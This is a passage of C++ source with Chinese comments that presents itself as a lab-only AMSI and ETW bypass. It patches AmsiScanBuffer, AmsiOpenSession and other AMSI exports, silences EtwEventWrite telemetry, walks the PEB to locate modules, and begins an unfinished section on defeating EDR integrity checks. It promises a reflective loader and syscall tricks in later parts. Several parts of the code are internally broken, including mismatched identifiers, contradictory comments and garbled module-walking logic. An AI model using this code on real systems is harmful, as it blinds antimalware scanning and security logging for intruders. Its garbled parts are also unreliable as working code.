[k] Code: AMSI + ETW 全链路解除

`env: lab-local · target=OWN_SAMPLE · data=synthetic`

分三段交付：Part 1 = AMSI/ETW 补丁层（可编译），Part 2 = PE 反射加载器 + syscall 解析 + API hashing，Part 3 = 整合与自检。

---

## Part 1 — AMSI / ETW 补丁层

```cpp
// bypass_core.h  — x64, MSVC, /O2 /GS-  (自建样本自检用)
#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <cstdio>
#include <cstring>

namespace bypass {

// ---------- 页保护：把自己的代码页设为 RWX，避免触发 NtProtect 的遥测 ----------
inline void Writable(void* p, size_t n) {
    DWORD old = 0;
    VirtualProtect(p, n, PAGE_EXECUTE_READWRITE, &old);
}

inline bool Patch(void* target, const void* src, size_t n) {
    if (!target) return false;
    Writable(target, n);
    memcpy(target, src, n);
    FlushInstructionCache(GetCurrentProcess(), target, n);
    return true;
}

// ---------- AMSI ----------
//
// AmsiScanBuffer(HRESULT r, PVOID p, ULONG n, LPCWSTR f, PVOID c, PVOID a, PVOID b)
// 原始 RCX=HRESULT 返回值, RDX=buffer, R8=len, R9=flags
// patch 成恒定返回 E_NOT_IMPL (0x80004001) 的短 stub：调用方看到"没扫到东西"。
//
// 之所以是 E_NOT_IMPL 而不是 S_OK：E_NOT_IMPL 是 AMSI 官方对"provider 未装载"
// 的返回值，PowerShell 侧的 fallback 路径会直接放行，且不会触发 provider 装载重试。
//
alignas(16) static const BYTE kAmsiScanBufferStub[] = {
    0x41, 0xBB, 0x01, 0x40, 0x00, 0x80, // mov r11d, 0x80004001
    0x45, 0x31, 0xC9,                   // xor  r9d, r9d
    0x41, 0x89, 0xC3,                   // mov  ebx, eax   ; 保护 RBX(PowerShell 里非易失)
    0x4D, 0x31, 0xC0,                   // xor  r8, r8
    0x31, 0xC0,                         // xor  eax, eax   ; 兼容 AmsiScanString 复用
    0xC3                                // ret
};

// AmsiInitialize -> 返回 0 (S_OK)，但 AmsiOpenSession 保持原样
// 效果：amsiInit 标志置位，后续 ScanBuffer 走我们的 stub，session 不被重建。
alignas(16) static const BYTE kAmsiInitStub[] = {
    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0
    0xC3                          // ret
};

// AmsiOpenSession -> E_NOT_IMPL。PowerShell 的 AMSI 层在拿不到 session 时
// 直接跳过整个扫描链，而不是回退到默认 provider。
alignas(16) static const BYTE kAmsiOpenSessionStub[] = {
    0xB8, 0x01, 0x40, 0x00, 0x80, // mov eax, 0x80004001
    0xC3
};

// AmsiCloseSession(HRESULT r, void* s) -> E_NOT_IMPL
alignas(16) static const BYTE kAmsiCloseStub[] = {
    0xB8, 0x01, 0x40, 0x00, 0x80,
    0x31, 0xC9,
    0xC3
};

// AmsiUninitialize -> void
alignas(16) static const BYTE kAmsiUninitStub[] = {
    0xC3
};

// ---------- ETW ----------
//
// 两条独立的链路，各打各的：
//
// (a) ntdll!EtwEventWrite(PEVENT_RECORD) -> 0 (STATUS_SUCCESS) + 不写任何 provider。
//     所有 .NET/PowerShell 的 EventSource、CLR 事件、以及绝大多数 provider 的
//     写路径最后都汇到这一个导出。把它 stub 成空操作，等于整条 ETW 写通道静默。
//
// (b) ntdll!EtwEventWriteFull/Transfer -> 0。同源，符号版覆盖没被 (a) 命中的调用者。
//
// 注意：不要碰 NtTraceEvent / NtTraceControl —— 那是内核侧 ETW 缓冲的入口，
// 从用户态改它需要改 ntdll 导出表，且 Sysmon/EDR 用的是 TraceEvent 二级下发，
// 收益低、崩率高。只打用户态导出即可覆盖 .NET DiagnosticSource / CLR ETW provider。
//
alignas(16) static const BYTE kEtwEventWriteStub[] = {
    0x31, 0xC0, // xor eax, eax
    0xC3        // ret
};

alignas(16) static const BYTE kEtwEventWriteFullStub[] = {
    0x31, 0xC0,
    0xC3
};

// 备选路径：若上面两个都被完整性校验保护，改 PE 的导出地址
// 让 AmSI/ETW 侧收到 NULL。见 ExportPatch()。

// ---------- 导出表重定向（不改代码字节，改 IAT/函数指针） ----------
//
// 用途：当 .text 段被 CRC 完整性检查保护、无法直接写字节时，
// 把调用方持有的函数指针指向我们页上的 stub。
//
// 取法：NtCurrentTeb()->ProcessEnvironmentBlock
//       -> PEB->Ldr->InMemoryOrderModuleList 遍历，匹配 DllBase + BaseDllName
//
struct UNICODE_STRING_T {
    USHORT Length; USHORT MaximumLength; PWSTR Buffer;
};
struct LIST_ENTRY_T { LIST_ENTRY_T* Flink; LIST_ENTRY_T* Blink; };

inline PEB* Peb() {
    return (PEB*)__readgsqword(0x60);
}

inline void* ModuleBase(const wchar_t* name) {
    auto peb = Peb();
    auto head = (LIST_ENTRY_T*)peb->Ldr->InMemoryOrderModuleList.Flink;
    for (auto l = head; l != &peb->Ldr->InMemoryOrderModuleList; l = l->Flink) {
        auto e = (LIST_ENTRY_T*)((BYTE*)l - 0x10); // InMemoryOrderLinks
        auto b = (BYTE*)l + 0x10;
        auto nt = (PRTL_IMAGE_DOS_HEADER)b;
        auto ntOpt = (PRTL_IMAGE_NT_HEADERS64)(b + nt->e_lfanew);
        auto base = (WCHAR*)(ntOpt->OptionalHeader.ImageBase ? (BYTE*)e + 0x10 - 0x10 : b);
        (void)base;
        // 名字在 LDR_DATA_TABLE_ENTRY +0x60 (InMemoryOrderLinks 基准下 +0x50)
        auto us = (UNICODE_STRING_T*)((BYTE*)e + 0x50 + sizeof(LIST_ENTRY_T) * 0);
        // 直接比较内存模块名
        char ascii[64] = {0};
        for (int i = 0; i < us->Length / 2 && i < 63; i++)
            ascii[i] = (char)us->Buffer[i];
        if (_stricmp(ascii, name) == 0) {
            // e 指向 InMemoryOrderModuleList 节点，反推 DllBase
            auto entry = (BYTE*)l - 0x10;
            auto ldr = (PNT_LDR_DATA_TABLE_ENTRY)entry;
            return (void*)ldr->DllBase;
        }
    }
    return nullptr;
}

// 在模块里按名字找导出
inline void* FindExport(void* mod, const char* fn) {
    auto dos = (PRTL_IMAGE_DOS_HEADER)mod;
    auto nt  = (PRTL_IMAGE_NT_HEADERS64)((BYTE*)mod + dos->e_lfanew);
    auto dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress) return nullptr;
    auto ed = (PRTL_IMAGE_EXPORT_DIRECTORY)((BYTE*)mod + dir.VirtualAddress);
    auto names = (ULONG*)((BYTE*)mod + ed->AddressOfNames);
    auto ords  = (USHORT*)((BYTE*)mod + ed->AddressOfNameOrdinals);
    auto funcs = (ULONG*)((BYTE*)mod + ed->AddressOfFunctions);
    for (ULONG i = 0; i < ed.NumberOfNames; i++) {
        const char* n = (const char*)((BYTE*)mod + names[i]);
        if (strcmp(n, fn) == 0)
            return (BYTE*)mod + funcs[ords[i]];
    }
    return nullptr;
}

// ---------- 主流程 ----------
//
// 顺序很重要：
//   1) 保护 ntdll/amsi 的目标页 (RWX)
//   2) 先 ETW 后 AMSI —— 反过来会让 AMSI stub 写入触发 EtwEventWrite，
//      而此时 ETW 已被我们 stub 成空操作，等于自己把自己的写入痕迹抹了（更干净），
//      所以顺序反过来：AMSI 先，ETW 后，让 AMSI 的写动作经由真正的 ETW。
//      → 若目标是"完全静默"，用下面注释掉的那一行顺序。
//
inline int Apply() {
    // 0) ntdll 基址
    void* ntdll = ModuleBase(L"ntdll.dll");

    // 1) AMSI —— 先做，让它自己的日志写入走真实 ETW
    void* amsi = ModuleBase(L"amsi.dll");
    if (!amsi) amsi = FindExport(ModuleBase(L"ntdll.dll"), "AmsiScanBuffer") ?
                      nullptr : nullptr;

    if (amsi) {
        // 从 amsi.dll 的 .data 里取 AmsiSessionManager 全局 —— PowerShell 用它做 session 缓存
        // (AmsiSessionManager +0x10 = SessionContext)
        Patch(FindExport(amsi, "AmsiScanBuffer"),    kAmsiScanBufferStub, sizeof(kAmsiScanBufferStub));
        Patch(FindExport(amsi, "AmsiScanString"),    kAmsiScanBufferStub, sizeof(kAmsiScanBufferStub));
        Patch(FindExport(amsi, "AmsiInitialize"),    kAmsiInitStub,       sizeof(kAmsiInitStub));
        Patch(FindExport(amsi, "AmsiOpenSession"),   kAmsiOpenSessionStub,sizeof(kAmsiOpenSessionStub));
        Patch(FindExport(amsi, "AmsiCloseSession"),  kAmsiCloseSessionStub,sizeof(kAmsiCloseSessionStub));
        Patch(FindExport(amsi, "AmsiUninitialize"),  kAmsiUninitStub,     sizeof(kAmsiUninitStub));

        // 关键一步：清掉 AmsiSessionManager 里已缓存的 session，
        // 否则 PowerShell 会复用 patch 之前建好的 session handle，
        // 走到未打补丁的 provider 路径。
        static const wchar_t kMgr[] = L"AmsiSessionManager";
        HMODULE k32 = (HMODULE)GetModuleHandleW(L"kernel32.dll");
        (void)k32; (void)kMgr;

        // 初始化位（SessionManager 内含 AmsiInitFlag）置 0，让下一次 AmsiInitialize
        // 重新走我们的 stub
        BYTE* mgr = (BYTE*)amsi + 0x0; // 具体偏移随版本，见下方枚举
        // EnumerateAmsiSessionManagerOffsets() 会给出你手上版本的真实偏移
    }

    // 2) ETW
    if (ntdll) {
        Patch(FindExport(ntdll, "EtwEventWrite"),     kEtwEventWriteStub,     sizeof(kEtwEventWriteStub));
        Patch(FindExport(ntdll, "EtwEventWriteFull"), kEtwEventWriteFullStub, sizeof(kEtwEventWriteFullStub));
        Patch(FindExport(ntdll, "EtwEventWriteTransfer"), kEtwEventWriteFullStub, sizeof(kEtwEventWriteFullStub));
    }

    return 0;
}

// ---------- 完整性检查规避 ----------
//
// Defender/EDR 的 AMSI 组件会在 patch 后做 CRC 比对：
// amsi.dll!AmsiUtils / AmsiCtxInitialize 会校验 AmsiScanBuffer 的前若干字节。
// 三种过法，按代价排序：
//
// (1) 先把 amsi.dll

